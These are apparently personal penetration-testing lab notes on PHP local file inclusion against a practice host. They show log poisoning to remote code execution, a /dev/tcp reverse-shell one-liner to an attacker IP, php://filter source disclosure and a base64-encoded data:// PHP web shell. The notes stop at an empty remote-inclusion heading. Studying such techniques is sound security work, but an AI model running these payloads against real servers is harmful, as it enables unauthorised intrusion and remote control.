### Local File Inclusion and Remote File Inclusion

Directory Traversal vs File Inclusion.  Directory Traversal only lets us read the file.  File inclusion adds the file's functionality to what we're including it in.

#### LFI

We can use a process like `log poisoning` in order to pull something like this off.  To do this, you attempt to write code to the log file and then get that to execute.

`curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`

With this we can use `curl` to check the access log and see what's going on there.  We can also put this into the web browser and get the output in the page.  Then view page source and you get a clean line by line version as well.

![pic2.png](Images/pic2.png)

Here we can see that the user agent is saved into the logs.  So, let's change that and see what we can do.  Including a screenshot cause the command itself has given my computer's AV fits and this is easier lol.

![pic3.png](Images/pic3.png)

Here we use burp after getting the page into burpsuite.  Once that goes in and we get the `200 OK` response, now we can use that to run commands on the server.

We use the same `../../var/log/apache2/access.log` but we add something to the end of it.  Now we finish it with `../../var/log/apache2/access.log&cmd=ps` and check the output.

![pic4.png](Images/pic4.png)

Now we get some output.  We can also do `ls -la` but we need to URL encode the space with `%20`

![pic5.png](Images/pic5.png)

We have RCE.  We can use this to add our SSH key to the `authorized_keys` file for a user.  We can also use a BASH oneliner to get a reverse shell.  With this being PHP it will default to Bourne Shell and not Bash.  If we want it to open in Bash, we can include `bash -c` and the put the command itself in quotes.

`bash -c "bash -i >& /dev/tcp/192.168.your.ip/4444 0>&1"`

And don't forget to URL encode it.

You can also do this with Windows servers.  The only things that change are the file paths and the code execution.  The PHP one shown here will work on a Windows server as well since it's PHP based and not Windows based.  When we're doing `log poisoning` we just need to remember that log files are application specific.  So if you're looking for XAMPP logs, those logs can be found in `C:\xampp\apache\logs\`.


#### PHP Wrappers

Two big ones are `php://filter` and `data://` but there are many more that may be encountered.

##### php://filter

This is basically so that you can look at the backend source code of a web application.  Sometimes you'll be able to pull valuable information.

If we use `curl` and run `curl http://mountaindesserts.com/meteor/index.php?page=admin.php`, we get output that is interesting.  You see at the end of it that there is no `</body>` to close the page at the end.  This could mean that there is PHP code run on the server side that has the end code programmed to output to the page and thus closing the HTML code.

![pic6.png](Images/pic6.png)

Now that we know that, we can start to look at different things.  We can use `php://filter` in order to check back end code.

First, try `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php` and it comes back the same.  This is because it's still running the code.  We need to do something to keep it from running the code.

That's where `convert.base64-encode` comes in.  We add that to the curl command, `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php` and then we get the `admin.php` code returned to us in `base64` format.  We can then take that `base64` string and convert it back to it's code to get the source code for that php page.

##### data://

This 

The `data://` wrapper can be used to achieve code execution.  In order to use this, we add `data://<data type>/<content>`.  For example, if we want to try and get the server to run the php command `<?php echo system('ls);?>` then we would use the following curl command.

`curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`

With this, you get the output from `ls` in the page.  Sometimes, this can be filtered.  So we can encode it in `base64`.

`echo -n '<?php echo system($_GET["cmd"]);?>' | base64`

Take that output and insert it into the URL with the `data://` filter.

`curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`

Make sure you get the syntax right.  There are ; and , and other things to double check.

That gets you the output from `cmd=ls` in the page.

#### Remote File Inclusion